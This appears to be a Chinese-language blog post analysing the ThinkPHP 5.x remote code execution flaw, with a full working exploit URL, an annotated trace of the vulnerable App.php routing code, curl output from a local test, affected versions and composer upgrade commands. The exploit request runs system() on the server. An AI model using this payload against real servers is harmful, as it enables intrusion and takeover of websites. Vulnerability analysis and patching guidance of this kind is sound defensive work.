---
title: ThinkPHP 5.x 远程代码getshell漏洞
date: 2018-12-26 15:03:09
tags:
categories:
  - PHP
---



## ThinkPHP 简介
ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，因为其易用性、扩展性，已经成长为国内颇具影响力的WEB应用开发框架


## 漏洞解析

漏洞引发的原因是框架对控制器名没有进行足够的检测，现拉取ThinkPHP v5.0.22 来进行测试

<!-- more -->

```
请求路由
    => http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l
系统解析为
    => 模块：index
    => 控制器：\think\app
    => 方法：invokefunction
    => 参数列表：
    => function=call_user_func_array
    => vars[0]=system
    => vars[1][]=ls%20-l
```

跟踪到路由解析代码 \thinkphp\library\think\App.php

```
    /**
     * 执行模块
     * @access public
     * @param array $result  模块/控制器/操作
     * @param array $config  配置参数
     * @param bool  $convert 是否自动转换控制器和操作名
     * @return mixed
     * @throws HttpException
     */
    public static function module($result, $config, $convert = null)
    {

        // ======================================================
        // 未进行过滤直接以 / 分解来进行解析
        // ======================================================
        if (is_string($result)) {
            $result = explode('/', $result);
        }

        ...

        // ======================================================
        // 未进行过滤直接赋值为 $result[1] 即 \think\app 并进行实例化
        // ======================================================
        $instance = Loader::controller(
            $controller,                      // \think\app
            $config['url_controller_layer'], 
            $config['controller_suffix'],
            $config['empty_controller']
        );

        ...

        // =========================================
        // 传递 $result[2] 即 invokefunction 方法
        // is_callable([$instance, "invokefunction"]
        // =========================================
        if (is_callable([$instance, $action])) {  
            // 执行操作方法
            $call = [$instance, $action];
            // 严格获取当前操作方法名
            $reflect    = new \ReflectionMethod($instance, $action);
            $methodName = $reflect->getName();
            $suffix     = $config['action_suffix'];
            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
            $request->action($actionName);

        ...

        return self::invokeMethod($call, $vars);

        ...


    /**
     * 调用反射执行类的方法 支持参数绑定
     * @access public
     * @param string|array $method 方法
     * @param array        $vars   变量
     * @return mixed
     */
    public static function invokeMethod($method, $vars = [])
    {
        if (is_array($method)) {
            $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
            $reflect = new \ReflectionMethod($class, $method[1]);
        } else {
            // 静态方法
            $reflect = new \ReflectionMethod($method);
        }

        $args = self::bindParams($reflect, $vars);
        // ===============================================
        // 传递uri参数
        // var_dump($args);
        // --------------------------
        // array(2) {
        //   [0]=>
        //   string(20) "call_user_func_array"
        //   [1]=>
        //   array(2) {
        //     [0]=>
        //     string(6) "system"
        //     [1]=>
        //     array(1) {
        //       [0]=>
        //       string(5) "ls -l"
        //     }
        //   }
        // }
        // ===============================================
        self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');

        // =======================================================
        // 即通过 invokeFunction 传递系统调用给 call_user_func_array
        // 从而调用 system("ls -l")
        // =======================================================
        return $reflect->invokeArgs(isset($class) ? $class : null, $args);
    }


    ...


    /**
     * 执行函数或者闭包方法 支持参数调用
     * @access public
     * @param string|array|\Closure $function 函数或者闭包
     * @param array                 $vars     变量
     * @return mixed
     */
    public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);

        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');

        return $reflect->invokeArgs($args);
    }
```


```
漏洞测试结果

# curl "http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l"
total 13
-rw-r--r-- 1 pc-user 197121 850 Sep  7 21:33 favicon.ico
-rw-r--r-- 1 pc-user 197121 766 Sep  7 21:33 index.php
-rw-r--r-- 1 pc-user 197121  24 Sep  7 21:33 robots.txt
-rw-r--r-- 1 pc-user 197121 840 Sep  7 21:33 router.php
drwxr-xr-x 1 pc-user 197121   0 Dec 26 22:18 static
```

## 受影响版本范围
ThinkPHP 5.0.x < 5.0.23
ThinkPHP 5.1.x < 5.1.31

大家看一下相关链接中github版本列表，参考github release列表的更新内容，选择对自己升级影响最小的，最好的话就是直接升级到最新版本，要想不受漏洞影响，至少应该升级为
ThinkPHP 5.0.23
ThinkPHP 5.1.31
```
composer require topthink/framework=v5.0.23
composer require topthink/framework=v5.1.31

升级后确认版本已更新
# composer show topthink/framework

name     : topthink/framework
descrip. : the new thinkphp framework
keywords : framework, orm, thinkphp
versions : * v5.0.23
type     : think-framework
...
```

## 相关链接
[ThinkPHP composer包列表(composer 可以拉取的版本列表)](https://packagist.org/packages/topthink/framework)
[ThinkPHP github版本列表(更新内容说明参考)](https://github.com/top-think/think/releases)
[ThinkPHP 官方漏洞说明](https://blog.thinkphp.cn/869075)
[ThinkPHP 5.x 远程代码getshell漏洞](https://hblong.github.io/2018/12/26/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81getshell%E6%BC%8F%E6%B4%9E/)